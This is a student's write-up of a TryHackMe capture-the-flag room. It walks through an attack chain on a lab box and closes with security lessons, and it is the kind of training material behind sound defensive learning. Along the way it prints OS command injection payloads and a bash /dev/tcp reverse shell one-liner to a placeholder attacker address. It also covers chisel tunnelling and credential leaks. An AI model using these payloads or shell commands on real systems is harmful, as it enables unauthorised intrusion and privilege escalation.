# TryHackMe: Infinity Pool, my first proper chained box

**Room:** Infinity Pool (Hacker Holidays 2026, Day 11)
**Category:** Web / Boot2Root
**Where I'm at:** Final year CS student, just started working through TryHackMe rooms

## Why I picked this one

I'm building toward defence/cyber grad scheme applications this autumn, and I wanted something that wasn't just "run gobuster, find the one obvious thing, get root." Infinity Pool forced me to actually chain discoveries together rather than lean on a scanner, which is the kind of patience I keep hearing employers say they want to see.

Full disclosure, this writeup is honest about the fact that I got properly stuck a few times, not just on the hacking bit but on basic terminal juggling. I think that's worth writing down rather than editing out, because I suspect a lot of people hit the same wall when they start doing anything with tunnelling.

## The chain, in short

```
robots.txt leaks /status
  hidden "ping" tool = command injection
  reverse shell as web
  enumerate loopback services (ss -tlnp)
  Watchtower ops console leaks FreePBX creds
  chisel tunnel out to browse FreePBX UCP
  voicemail widget leaks an automation Bearer key
  root-owned /jobs/export endpoint has its own command injection
  root shell
```

## Getting the foothold

The landing page for "Byte Lotus" hotel was dead simple, no login, nothing obviously interactive. First move was just checking robots.txt, which is such an easy win it feels like cheating:

```
User-agent: *
Disallow: /internal/
Disallow: /status
```

If a site tells you not to look somewhere, that's basically a signpost. /status turned out to be a "check if a sister property responds" tool. Type in an IP, it pings it. The second I saw raw ping output reflected back at me, I figured it was almost certainly building a shell command out of my input directly.

Confirmed it with:
```
10.129.66.149; id
```
and got uid=1001(web) appended after the ping output. That's textbook OS command injection. The app was probably doing something like subprocess.run(f"ping -c 1 {user_input}", shell=True) under the hood.

From there, standard reverse shell:
```
10.129.66.149; bash -c 'bash -i >& /dev/tcp/<my_ip>/4444 0>&1'
```
caught on a nc -lvnp 4444 listener. Landed as web.

## Where I actually got confused (the honest bit)

This is the part I want to be upfront about. Once I had the shell, I completely tangled myself up trying to run a second tool, chisel, for port forwarding, in the same terminal window that was holding my reverse shell connection open.

I tried to Ctrl+Z and bg it to free up the prompt, which is a thing that works on a normal local terminal, but this shell explicitly told me "bash: no job control in this shell," and I didn't clock what that meant in the moment. Instead of backgrounding the tunnel process, I ended up suspending the nc listener itself, which killed the connection.

I lost a good chunk of time going back and forth trying to fix a broken shell instead of just admitting it and restarting clean. The fix, once I actually stopped and thought about it, was obvious. One job per terminal window. Reverse shell one stays untouched running the chisel tunnel. A completely separate terminal and separate reverse shell handles running commands. No suspending, no job control tricks, just more windows.

Lesson for next time: the second something with job control or backgrounding starts getting weird in a shell obtained via netcat, stop trying to force it and just open a fresh connection instead. It's faster than debugging a shell that was never designed for interactive job control in the first place.

## Enumerating internally

Once stable, ss -tlnp from inside showed a bunch of loopback-only services: 127.0.0.1:3000, :8080, :8088, :8089, :9000, :3306, :5038. That 5038 was a nice little tell for anyone who's seen it before. It's the Asterisk Manager Interface port, which usually means FreePBX is running somewhere on the box.

Port 3000 turned out to be an internal ops console called Watchtower, which straight up told me its own endpoints in the HTML (/api/health, /api/config). No auth on it at all, it trusted "network position," meaning anyone hitting it from inside was assumed to be legit. /api/config dumped the FreePBX UCP portal address, a username and password for it flagged in the JSON itself as unrotated default template creds, and the address of a third internal service on port 9000.

That's three separate findings from one unauthenticated internal endpoint. Genuinely felt like the "aha" moment of the room.

## Getting into FreePBX

Port 8080 is loopback-only, and the UCP login is JS/AJAX-driven, so plain curl wasn't going to cut it. I needed an actual browser talking to it. Used chisel to tunnel it out: chisel server on my AttackBox, chisel client on the target (had to curl the chisel binary across from a quick Python HTTP server since the target didn't have it installed), reverse-forwarding both port 8080 and 9000 back to my machine.

Once that was up, http://127.0.0.1:8080/ucp/ in Firefox on my AttackBox loaded the real UCP login, and the leaked creds worked immediately.

Inside, added a Voicemail widget to a new dashboard. Inbox showed 1 message. Opened it and the Caller ID field on the one voicemail read:

```
"Automation Key cc_auto_7b3f9a1c4e0d2f6a" <9000>
```

Someone had clearly templated an internal API key straight into a caller ID name field for calls tied to extension 9000. Total misconfiguration, but a really satisfying one to find because nothing about it screamed "look here." You genuinely had to go poking through a voicemail inbox to notice it.

## Root

That key authenticated against /jobs/export on port 9000, which builds a tar command server-side and, unsurprisingly, doesn't sanitise the report field it drops into that command. Sending a normal report value showed the app helpfully echoing back the exact shell command it was about to run, which made the injection easy to spot:

```json
{"command":"tar czf /var/automation/exports/test.tgz /var/automation/data 2>&1", ...}
```

Injected with a # to comment out the trailing .tgz so it wouldn't break the command:
```json
{"report":"test; id #"}
```
Result: uid=0(root).

Same trick as the first injection, just with a # this time to deal with the leftover filename suffix. Swapped id for a reverse shell payload into a second listener and landed root@tryhackme-2404.

## What I'd actually take away from this

robots.txt is not a security control, it's a map. Obvious in hindsight, but worth internalising properly.

Loopback-only doesn't mean safe. Once you have any foothold at all, "internal" services are just as reachable as public ones.

Unauthenticated by network position is not authentication. Watchtower trusted anyone hitting it locally, and that one decision is what unravelled the rest of the chain.

Job control on a raw netcat shell is a trap. Don't try to background or foreground things in a shell that already told you it has no job control. Just open another one.

The whole room is really a lesson in not needing one big flashy exploit. Every step was a small, almost boring finding (a disallowed path, an unauthenticated JSON endpoint, a caller ID field) that only became dangerous once chained together.

Two flags down, and a much better mental model of what to actually do once I have a shell but the interesting stuff is behind a loopback address. I suspect that's going to come up again.
